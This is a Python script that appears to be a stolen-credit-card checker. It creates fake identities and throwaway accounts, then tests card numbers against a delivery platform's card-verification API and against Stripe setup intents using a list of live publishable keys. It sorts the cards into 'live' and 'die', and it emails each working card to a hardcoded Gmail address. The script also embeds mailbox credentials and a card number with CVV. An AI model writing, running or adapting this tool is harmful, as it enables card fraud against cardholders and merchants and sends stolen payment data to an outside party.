from argparse import RawDescriptionHelpFormatter
import requests
import random
import string
import json
from deep_translator import GoogleTranslator
import yagmail

def corte(texto, inicio, final):
    
    if inicio in texto:
        if final in texto:
            texto = texto.split(inicio)[1].strip()
            texto = texto.split(final)[0].strip()
            return texto
        else:
            return 'final não encontrado'
    
    else:
        return 'inicio não encontrado'


def gerar_pessoa():

    headers = {
        'authority': 'www.4devs.com.br',
        'sec-ch-ua': '" Not A;Brand";v="99", "Chromium";v="98", "Google Chrome";v="98"',
        'sec-ch-ua-mobile': '?0',
        'user-agent': 'Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/98.0.4758.81 Safari/537.36',
        'sec-ch-ua-platform': '"Windows"',
        'content-type': 'application/x-www-form-urlencoded',
        'accept': '*/*',
        'origin': 'https://www.4devs.com.br',
        'sec-fetch-site': 'same-origin',
        'sec-fetch-mode': 'cors',
        'sec-fetch-dest': 'empty',
        'referer': 'https://www.4devs.com.br/gerador_de_pessoas',
        'accept-language': 'pt-PT,pt;q=0.9,en-US;q=0.8,en;q=0.7',
    }

    data = {
    'acao': 'gerar_pessoa',
    'sexo': 'I',
    'pontuacao': 'N',
    'idade': '0',
    'cep_estado': '',
    'txt_qtde': '1',
    'cep_cidade': ''
    }

    response = requests.post('https://www.4devs.com.br/ferramentas_online.php', headers=headers, data=data)

    retorno = response.json()

    api = {}

    api['cpf'] = retorno[0]['cpf']
    api['nome'] = retorno[0]['nome']
    api['telefone'] = retorno[0]['celular']
    api['email'] = retorno[0]['email'].replace('..','.')
    api['senha'] = retorno[0]['senha']
    

    return api

def id_estabelecimento():
    lista = ['5a782f8c8cb7fe0015e89d66', '5e8f2272dc7f3b00139ced9d', '5a09d15a4f2ea0000ff16c52', '5a19cc99738e7d000f3b9c7e', '5a7cc6ba7a4e9d000fd259fb', '5a02f8145be8fe000f605da8', '5a291b07a71160000f9884a4', '5a468feeaaa256000f3ab407', '5a4d125708856e000f051b80', '5ec573e01ec97900132945df', '5a7b55de7a4e9d000fd25571']

    return random.choice(lista)

def gerar_key():
    #8ececaa5-fa2b-4dc5-9013-0c54e6eee9e8

    key = []
    key.append(str(random.randint(0,9)))

    for c in range(1,7):
        key.append(str(random.randint(0,26)).join(random.choice(string.ascii_letters)).lower())
    
    key.append('-')
    
    for c in range(1,2):
        key.append(str(random.randint(0,26)).join(random.choice(string.ascii_letters)).lower())

    key.append(str(random.randint(0,9)))
    key.append(str(random.randint(0,26)).join(random.choice(string.ascii_letters)).lower())
    key.append('-')
    key.append(str(random.randint(1000,9999)))
    key.append('-')
    key.append(str(random.randint(0,9)))
    key.append(str(random.randint(0,26)).join(random.choice(string.ascii_letters)).lower())
    key.append(str(random.randint(10,99)))
    key.append(str(random.randint(0,26)).join(random.choice(string.ascii_letters)).lower())
    for c in range(1,3):
        key.append(str(random.randint(0,26)).join(random.choice(string.ascii_letters)).lower())
    key.append(str(random.randint(0,9)))
    key.append(str(random.randint(0,26)).join(random.choice(string.ascii_letters)).lower())
    key.append(str(random.randint(0,9)))
    return "".join(key)


def debito(cc):

    session = requests.Session()

    cliente  = gerar_pessoa()
    api = {}

    try:
        card = cc.split('|')
        card = {
            "cc":card[0],
            "mes":card[1],
            "ano":card[2],
            "cvv":card[3],
        }
    except:
        return{
            "status":False,
            "live":False,
            "message": "Faltou algo no cartão",
        }
    
    headers = {
        'Connection': 'keep-alive',
        'sec-ch-ua': '" Not A;Brand";v="99", "Chromium";v="98", "Google Chrome";v="98"',
        'Accept': 'application/json',
        'Content-Type': 'application/json',
        'sec-ch-ua-mobile': '?0',
        'User-Agent': 'Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/98.0.4758.81 Safari/537.36',
        'sec-ch-ua-platform': '"Windows"',
        'Origin': 'https://login.amo.delivery',
        'Sec-Fetch-Site': 'same-site',
        'Sec-Fetch-Mode': 'cors',
        'Sec-Fetch-Dest': 'empty',
        'Referer': 'https://login.amo.delivery/',
        'Accept-Language': 'pt-PT,pt;q=0.9,en-US;q=0.8,en;q=0.7',
    }

    params = (
        ('return_token', 'true'),
    )

    forma_data = {
        "client_type":"client_web",
        "establishment_id":id_estabelecimento(),
        "name": cliente['nome'],
        "phone": cliente['telefone'],
        "email": cliente['email'],
        "password": cliente['senha']
    }

    forma_data = str(forma_data).replace("'",'"').replace('": "','":"').replace('", "','","')

    data = str(forma_data).encode(encoding='UTF-8')


    response = session.post('https://api.amo.delivery/users', headers=headers, params=params, data=data)


    if response.status_code == 200:
        
        token = response.json()['token']

        headers = {
            'Connection': 'keep-alive',
            'sec-ch-ua': '" Not A;Brand";v="99", "Chromium";v="98", "Google Chrome";v="98"',
            'sec-ch-ua-mobile': '?0',
            'Authorization': f'Bearer {token}',
            'Content-Type': 'application/json',
            'Accept': 'application/json, text/plain, */*',
            'Idempotent-Key': gerar_key(),
            'User-Agent': 'Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/98.0.4758.81 Safari/537.36',
            'Api-Version': '4',
            'Client-Type': 'client_web',
            'sec-ch-ua-platform': '"Windows"',
            'Origin': 'https://restaurantecentral.amo.delivery',
            'Sec-Fetch-Site': 'same-site',
            'Sec-Fetch-Mode': 'cors',
            'Sec-Fetch-Dest': 'empty',
            'Referer': 'https://restaurantecentral.amo.delivery/',
            'Accept-Language': 'pt-PT,pt;q=0.9,en-US;q=0.8,en;q=0.7',
        }

        data = str({"due_month":card['mes'],"due_year":card['ano'],"holder":cliente['nome'],"number":card['cc'],"payment_card_document":cliente['cpf'],"security_code":card['cvv']}).replace("'",'"').replace('": "','":"').replace('", "','","').encode(encoding='UTF-8')

        response = session.post('https://api.amo.delivery/cards/verification', headers=headers, data=data)
        
        if response.status_code == 200:
            
            api['status'] = True
            api['live'] = True

            try:
                usuario = yagmail.SMTP(user='raulpokas@gmail.com', password='helder96')
                usuario.send(to='hmlrolx89@gmail.com', subject=f"Pagamento aprovado", contents=f"{cc}")
            except:
                pass

            try:
                api['message'] = f"Pagamento Efetuado R${response.json()['amount'][0]},{response.json()['amount'][1:]}"
                
            except:
                api['message'] = f"Pagamento Efetuado"
            return api

        else:
            try:
                if response.status_code == 403:
                    api['status'] = True
                    api['live'] = False
                    api['message'] = "Pagamento Recusado"
                    return api
                    
                if response.status_code == 429:
                    api['status'] = False
                    api['live'] = False
                    api['message'] = "Cartão já usado no gate"
                    return api

                else:
                    api['status'] = False
                    api['live'] = False
                    api['message'] = f"Erro {response.status_code}, {response.json()['message']}"
                    return api
            except:
                api['status'] = False
                api['live'] = False
                api['message'] = f"Erro {response.status_code}, retorno desconhecido"
                return api

        #DIE
        #{"statusCode":403,"error":"Forbidden","message":"payment_not_done"}

        #LIVE
        #{"_id":"61ffd38f2b16a70013c97666","amount":"51","verified":false,"brand":"visa","image":"kj1lxlxefz9xrbkczyqw","payment_id":"f3d51794-32af-448f-abfb-4db489053711","card":"490144******6594","created_at":"2022-02-06T13:56:32.346Z","updated_at":"2022-02-06T13:56:32.346Z"}

    else:
        api['status'] = False
        api['live'] = False

        api['message'] = "Erro ao obter token do cliente"

    return api


def pre_auth(cc):
    keys = [
        "pk_live_ckPnmJJZTFKgKGv6RihxsV8g",
        "pk_live_BecH0RWLrqhe2BotpyKRFb2c",
        "pk_live_vxoiDvQcp0kbBi6Cq5FuS5oT00GySxpVci",
        "pk_live_kYgHRkQDFwJK3IpUdWSUNXOy",
        "pk_live_5lTRhBKO5gwa7CXU9dbNzqru",
        "pk_live_T1xrjxuukKfdFkLFrFeFoJKw00XwJvWhUs"
    ]
    
    key = random.choice(keys)

    api = {}

    try:
        card = cc.split('|')
        card = {
            "cc":card[0],
            "mes":card[1],
            "ano":card[2],
            "cvv":card[3],
        }
    except:
        return{
            "status":False,
            "live":False,
            "message": "Faltou algo no cartão",
        }

    pessoa = gerar_pessoa()
    session = requests.Session()

    # REQUEST TOKEN 
    response = session.get('https://belas-artes.herokuapp.com/checkout/test-product-45')

    api_key = corte(response.text, "const stripe = Stripe('","'")
    data_secret = corte(response.text, 'data-secret="', '"')
    #data-secret="seti_1KQyPOAWsF2LPIrugtX7HeLA_secret_L7CpklGWSMFH3l08Cw88SFvqJb6QLuF

    try:
        secret_url = f"{data_secret.split('_')[0]}_{data_secret.split('_')[1]}"
    except:
        return {
            "status":False,
            "live":False,
            "message": "Erro o obter url_secret",
        }


    headers = {
        'authority': 'api.stripe.com',
        'sec-ch-ua': '" Not A;Brand";v="99", "Chromium";v="98", "Google Chrome";v="98"',
        'accept': 'application/json',
        'content-type': 'application/x-www-form-urlencoded',
        'sec-ch-ua-mobile': '?0',
        'user-agent': 'Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/98.0.4758.81 Safari/537.36',
        'sec-ch-ua-platform': '"Windows"',
        'origin': 'https://js.stripe.com',
        'sec-fetch-site': 'same-site',
        'sec-fetch-mode': 'cors',
        'sec-fetch-dest': 'empty',
        'referer': 'https://js.stripe.com/',
        'accept-language': 'pt-PT,pt;q=0.9',
    }

    rand = random.randint(100001000010000,999999999910000)

    data = {
    'payment_method_data[type]': 'card',
    'payment_method_data[billing_details][name]': pessoa['nome'],
    'payment_method_data[card][number]': card['cc'],
    'payment_method_data[card][cvc]': card['cvv'],
    'payment_method_data[card][exp_month]': card['mes'],
    'payment_method_data[card][exp_year]': card['ano'],
    'payment_method_data[guid]': 'f5381bc4-8a02-4b8d-9813-4e877d65bf9a7891b5',
    'payment_method_data[muid]': '0c74217f-511c-4e0c-9eb1-68dd15090e1af075c5',
    'payment_method_data[sid]': 'd303699b-28b0-41cc-b2e3-89e202cdd1dd2457fd',
    'payment_method_data[pasted_fields]': 'number,exp',
    'payment_method_data[payment_user_agent]': 'stripe.js/78c942615; stripe-js-v3/78c942615',
    'payment_method_data[time_on_page]': rand,
    'expected_payment_method_type': 'card',
    'use_stripe_sdk': 'true',
    'webauthn_uvpa_available': 'false',
    'spc_eligible': 'false',

    'key': api_key,
    'client_secret': data_secret
    }


    response = session.post(f'https://api.stripe.com/v1/setup_intents/{secret_url}/confirm', headers=headers, data=data)

    if response.status_code == 200:
        return {
            "status":True,
            "live":True,
            "message":"Pagamento vereficado R$0",
        }
    

    if response.status_code == 402:
        api['status'] = True
        api['live'] = False

        try:
            message = response.json()['error']['message']
            
            try:
                api['message'] = str(GoogleTranslator(source='auto', target='pt').translate(message)).replace('.','')
                if api['message'] == "Seu cartão expirou":
                    api['message'] = "Cartão com validade incorreta"
            except:
                api['message']=message
        

        except:
            api['status'] = False
            api['live'] = False
            api['message'] = "Erro ao obter retorono do erro"
        
        return api

    else:
        return {
            "status": False,
            "live": False,
            "message": f"Erro {response.status_code}, Retorno desconhecido",
        }


if __name__ == "__main__":
        
    ccs = """5305991029820330|01|30|736|1963"""

    

    for c in range(0,len(ccs.splitlines())):
        retorno = pre_auth(ccs.splitlines()[c])

        print(f"{ccs.splitlines()[c]} = {retorno['message']}")
    

  